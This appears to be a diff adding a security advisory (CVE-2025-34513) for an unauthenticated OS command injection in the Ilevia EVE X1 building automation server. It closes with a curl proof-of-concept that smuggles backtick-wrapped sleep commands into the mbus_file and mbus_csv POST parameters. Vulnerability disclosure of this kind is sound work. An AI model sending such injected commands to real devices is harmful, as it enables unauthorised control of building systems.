@@ -1,0 +1,53 @@
+
+Ilevia EVE X1 Server 4.7.18.0.eden (mbus) Unauthenticated Remote Command Injection
+
+
+Vendor: Ilevia Srl.
+Product web page: https://www.ilevia.com
+Affected version: <=4.7.18.0.eden
+
+Summary: EVE is a smart home and building automation solution designed
+for both residential and commercial environments, including malls, hotels,
+restaurants, bars, gyms, spas, boardrooms, and offices. It enables comprehensive
+control and monitoring of electrical installations through a highly customizable,
+user-friendly interface.
+
+EVE is a multi-protocol platform that integrates various systems within
+a smart building to enhance comfort, security, safety, and energy efficiency.
+Users can manage building functions via iPhone, iPad, Android devices, Windows
+PCs, or Mac computers.
+
+The EVE X1 Server is the dedicated hardware solution for advanced building
+automation needs. Compact and powerful, it is ideal for apartments, small
+to medium-sized homes, and smaller commercial installations. It is designed
+to manage entire automation systems reliably and efficiently.
+
+Desc: The EVE X1 server suffers from an unauthenticated OS command injection
+vulnerability. This can be exploited to inject and execute arbitrary shell
+commands through the 'mbus_file' and 'mbus_csv' HTTP POST parameters through 
+/ajax/php/mbus_build_from_csv.php script.
+
+Tested on: GNU/Linux 5.4.35 (armv7l)
+           GNU/Linux 4.19.97 (armv7l)
+           Armbian 20.02.1 Buster
+           Apache/2.4.38 (Debian)
+           PHP Version 7.3.31
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2025-5962
+Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2025-5962.php
+CVE ID: CVE-2025-34513
+CVE URL: https://www.cve.org/CVERecord?id=CVE-2025-34513
+
+
+01.05.2024
+
+--
+
+
+$ curl -X POST "http://ilevia:8080/ajax/php/mbus_build_from_csv.php" -d "mbus_file=`sleep 10`&mbus_csv=`sleep 7`"
+{"err":0,"msg":""}
